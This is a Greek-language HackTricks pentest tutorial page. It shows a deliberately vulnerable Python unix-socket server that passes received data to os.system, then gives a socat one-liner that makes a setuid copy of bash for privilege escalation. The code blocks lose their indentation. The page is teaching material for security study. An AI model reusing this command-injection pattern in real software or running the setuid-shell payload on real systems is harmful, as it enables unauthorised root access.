{{#include ../../banners/hacktricks-training.md}}

## Παράδειγμα δέσμευσης socket με Python

Στο παρακάτω παράδειγμα δημιουργείται ένα **unix socket** (`/tmp/socket_test.s`) και όλα όσα **λαμβάνονται** θα **εκτελούνται** από το `os.system`. Ξέρω ότι δεν πρόκειται να το βρείτε στην πραγματικότητα, αλλά ο στόχος αυτού του παραδείγματος είναι να δείτε πώς φαίνεται ο κώδικας που χρησιμοποιεί unix sockets και πώς να διαχειριστείτε την είσοδο στην χειρότερη δυνατή περίπτωση.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Εκτελέστε** τον κώδικα χρησιμοποιώντας python: `python s.py` και **ελέγξτε πώς ακούει το socket**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Εκμετάλλευση**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
{{#include ../../banners/hacktricks-training.md}}
